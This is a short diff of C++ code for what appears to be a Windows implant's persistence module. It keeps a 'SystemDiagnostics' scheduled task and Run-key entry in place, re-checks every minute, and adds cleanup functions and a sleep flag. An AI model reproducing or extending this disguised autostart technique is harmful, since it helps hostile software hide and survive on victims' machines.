@@ -51,6 +51,20 @@ static bool check_task() {
     int ret = system("schtasks /Query /TN SystemDiagnostics >nul 2>&1");
     return ret == 0;
 }
+
+static void remove_run_key() {
+    HKEY key;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+            KEY_WRITE, &key) == ERROR_SUCCESS) {
+        RegDeleteValueA(key, "SystemDiagnostics");
+        RegCloseKey(key);
+    }
+}
+
+static void remove_task() {
+    system("schtasks /Delete /TN SystemDiagnostics /F >nul 2>&1");
+}
 #endif
 
 void PersistenceModule::ensure_persistence() {
@@ -70,7 +84,7 @@ void PersistenceModule::ensure_persistence() {
 void PersistenceModule::init() {
     ensure_persistence();
     monitor_ = std::thread([this]() {
-        while (!g_safe_mode.load()) {
+        while (!g_safe_mode.load() && !g_deep_sleep.load()) {
             std::this_thread::sleep_for(std::chrono::minutes(1));
             ensure_persistence();
         }
@@ -79,3 +93,10 @@ void PersistenceModule::init() {
 }
 
 extern "C" Module* create_module() { return new PersistenceModule(); }
+
+void remove_persistence() {
+#ifdef _WIN32
+    remove_run_key();
+    remove_task();
+#endif
+}
